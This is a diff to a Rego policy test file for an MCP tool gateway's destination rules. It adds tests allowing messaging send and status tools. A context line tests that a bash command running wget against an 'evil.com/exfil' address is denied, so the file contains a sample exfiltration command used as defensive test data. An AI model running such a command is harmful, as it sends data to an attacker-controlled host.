@@ -133,6 +133,16 @@ test_destination_denied_bash_wget if {
   not mcp.destination_allowed("bash", {"command": "wget https://evil.com/exfil"})
 }
 
+# --- Messaging destination tests (RFA-np7t) ---
+
+test_destination_allowed_messaging_send if {
+  mcp.destination_allowed("messaging_send", {})
+}
+
+test_destination_allowed_messaging_status if {
+  mcp.destination_allowed("messaging_status", {})
+}
+
 # --------------------------------------------------------------------------
 # Step-Up Gating
 # --------------------------------------------------------------------------
